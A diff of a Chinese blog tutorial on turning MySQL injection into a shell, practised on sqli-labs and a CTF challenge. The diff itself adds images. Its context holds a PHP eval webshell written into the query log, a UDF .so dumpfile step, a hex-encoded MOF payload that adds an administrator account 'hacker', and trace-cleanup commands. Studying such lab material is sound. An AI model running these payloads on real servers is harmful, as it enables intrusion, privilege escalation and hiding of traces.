@@ -305,7 +305,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it ID /bin/bash</span><br></pre></td></tr></table></figure>
 
 <p>访问 IP + 端口，成功的话会如图所示</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/SqliLabs.png" class>
 <h2 id="0x03-getshell-方式"><a href="#0x03-getshell-方式" class="headerlink" title="0x03 getshell 方式"></a>0x03 getshell 方式</h2><h3 id="1-into-outfile-x2F-dumpfile-传🐎"><a href="#1-into-outfile-x2F-dumpfile-传🐎" class="headerlink" title="1. into outfile&#x2F;dumpfile 传🐎"></a>1. into outfile&#x2F;dumpfile 传🐎</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>into outfile利用的<strong>先决条件：</strong></p>
 <blockquote>
 <p>web目录具有写权限，能够使用单引号<br>探测到网站的路径，需要放置与能解析，能访问的地址；比如 &#x2F;uploads 这种接口<br>secure_file_priv 没有具体值（<strong>在mysql&#x2F;my.ini中查看</strong>）</p>
@@ -330,7 +330,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; )) order by 4 --+  // 回显报错</span><br><span class="line">?id=1&#x27; )) order by 3 --+  // 回显正确</span><br></pre></td></tr></table></figure>
 
 <h4 id="写入-shell"><a href="#写入-shell" class="headerlink" title="写入 shell"></a>写入 shell</h4><p>写入 shell 之前，先看一看 secure_file_priv 的权限如何</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/secure_file_priv.png" class>
 
 <ul>
 <li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li>
@@ -342,7 +342,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/mysql/security</span><br></pre></td></tr></table></figure>
 
 <p>查看下是否将数据库信息导出到文件中了：</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/cat_secure_data.png" class>
 
 <p>但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。</p>
 <p>所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p>
@@ -372,7 +372,7 @@
 <p>outfile 函数可以导出多行，而 dumpfile 只能导出一行数据；</p>
 <p>outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）</p>
 <p>成功写入 shell，连 🐎 试试</p>
-<h4 id="连🐎"><a href="#连🐎" class="headerlink" title="连🐎"></a>连🐎</h4>
+<h4 id="连🐎"><a href="#连🐎" class="headerlink" title="连🐎"></a>连🐎</h4><img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/outfileShell.png" class>
 
 <h3 id="2-堆叠注入-————-日志文件写-shell"><a href="#2-堆叠注入-————-日志文件写-shell" class="headerlink" title="2. 堆叠注入 ———— 日志文件写 shell"></a>2. 堆叠注入 ———— 日志文件写 shell</h3><h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><p>对应靶场 ———— sqli-Labs 38 </p>
 <p>源码如下：</p>
@@ -385,7 +385,7 @@
 <ul>
 <li>成功注入</li>
 </ul>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/logStackInjection.png" class>
 
 <h4 id="往日志中写入-shell"><a href="#往日志中写入-shell" class="headerlink" title="往日志中写入 shell"></a>往日志中写入 shell</h4><p>上述是题目背景，payload 要结合后续讲的写入 shell 使用</p>
 <hr>
@@ -398,7 +398,7 @@
 <p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell，可以通过这个命令查看。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;general%&#x27;</span>;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/logLike.png" class>
 
 <p>第一个参数：general_log 需要是 ON 的状态，这样 MySQL 可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
 <p>第二个参数：general_log_file 是保存 log 的位置。</p>
@@ -414,7 +414,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;;select &lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>此时我们的一句话木马已经写入成功了；但是由于这里的用户权限是 mysql 用户组的，所以无法 getshell。</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/logmysql.png" class>
 
 <p>不过在 Windows 下 phpstudy 测试是可以很成功的 getshell 的，相对于 Linux 中严格的 root 组，还是比较难的。</p>
 <h3 id="3-通过-udf-提权"><a href="#3-通过-udf-提权" class="headerlink" title="3. 通过 udf 提权"></a>3. 通过 udf 提权</h3><blockquote>
@@ -432,23 +432,23 @@
 <h4 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h4><ul>
 <li>刚好前阵子打了 NepCTF 比赛，其中就有一道 udf 提权的题目，题目链接如下</li>
 </ul>
-<p><a class="link"   target="_blank" rel="noopener" href="http://nep.lemonprefect.cn/category/web/challenge/15" >http://nep.lemonprefect.cn/category/web/challenge/15<i class="fas fa-external-link-alt"></i></a></p>
-<p>先看<a class="link"   target="_blank" rel="noopener" href="https://github.com/Drun1baby/CTFReposityStore/tree/main/NepCTF2nd/%E5%8D%9A%E5%AD%A6%E5%A4%9A%E9%97%BB%E7%9A%84%E8%8A%B1%E8%8A%B1-%E9%99%84%E4%BB%B6" >源码<i class="fas fa-external-link-alt"></i></a>当中的注入点：</p>
-
+<p><a class="link" target="_blank" rel="noopener" href="http://nep.lemonprefect.cn/category/web/challenge/15">http://nep.lemonprefect.cn/category/web/challenge/15<i class="fas fa-external-link-alt"></i></a></p>
+<p>先看<a class="link" target="_blank" rel="noopener" href="https://github.com/Drun1baby/CTFReposityStore/tree/main/NepCTF2nd/%E5%8D%9A%E5%AD%A6%E5%A4%9A%E9%97%BB%E7%9A%84%E8%8A%B1%E8%8A%B1-%E9%99%84%E4%BB%B6">源码<i class="fas fa-external-link-alt"></i></a>当中的注入点：</p>
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/multi_query.png" class>
 
 <p>在 <code>scores.php</code> 的 56 行这里，<code>multi_query</code> 引起的堆叠注入，所以我们后续的 payload 如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;evil code; #</span><br></pre></td></tr></table></figure>
 
 <p>这里也讲一讲为什么会想到 udf 提权吧，这个不是空穴来风。<br>题目附件这里给了个 init.sql，我们可以看到 ctf 用户 <code>*.*</code> 的 <code>file</code>和 <code>insert</code> 权限。</p>
 <p>且init.sql的score.ctf表也写明了flag_in_&#x2F;flag，要么通过读取文件的方式将flag读入获取，要么udf提权，操作系统函数。</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/udfGrant.png" class>
 
 <p>同时根据附件给的 <code>my.cnf</code>，配置文件都是默认配置，且 <code>secure-file-priv</code> 直接给到了 <code>plugin</code> 目录下</p>
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/udfConf.png" class>
 
-
-<p><font color=red>udf 提权的攻击分这么几步走</font></p>
+<p><font color="red">udf 提权的攻击分这么几步走</font></p>
 <p><strong>使用 dumpfile 写入 .so 文件</strong></p>
-<p>由于服务器是 linux-x64，在 github 选取合适的 <code>.so</code> 文件或者自己编译，本地使用 select 获取其 hex 值。也可以去国光师傅的工具栏直接拿 <a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html" >https://www.sqlsec.com/tools/udf.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>由于服务器是 linux-x64，在 github 选取合适的 <code>.so</code> 文件或者自己编译，本地使用 select 获取其 hex 值。也可以去国光师傅的工具栏直接拿 <a class="link" target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html<i class="fas fa-external-link-alt"></i></a></p>
 <p>得到要写入 .so 文件的东西之后，执行 payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;select &lt;十六进制编码&gt; into dumpfile &#x27;/usr/lib64/mysql/plugin/exp.so&#x27;;#</span><br></pre></td></tr></table></figure>
 
@@ -480,7 +480,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;  </span><br></pre></td></tr></table></figure>
 
 <p>执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下：</p>
-
+<img src="/2022/07/20/SQL%E6%B3%A8%E5%85%A5Getshell%E5%AD%A6%E4%B9%A0/mofSucc.png" class>
 
 <ul>
 <li>国光师傅这里还提到了对于 MOF 提权是需要清理痕迹的。</li>
@@ -489,7 +489,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
 
 <h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>其实最近面试下来，如果是考到 SQL 注入 getshell 这一块的话，实操过与只是懂理论差距还是很大的，写这篇文章希望对师傅们有所帮助 ~</p>
-<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html" >https://www.sqlsec.com/2020/11/mysql.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html" >https://www.sqlsec.com/2020/05/sqlilabs.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/334032.html" >https://www.freebuf.com/vuls/334032.html<i class="fas fa-external-link-alt"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6" >https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">https://www.sqlsec.com/2020/05/sqlilabs.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/334032.html">https://www.freebuf.com/vuls/334032.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6">https://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6<i class="fas fa-external-link-alt"></i></a></p>
 
             </div>
 
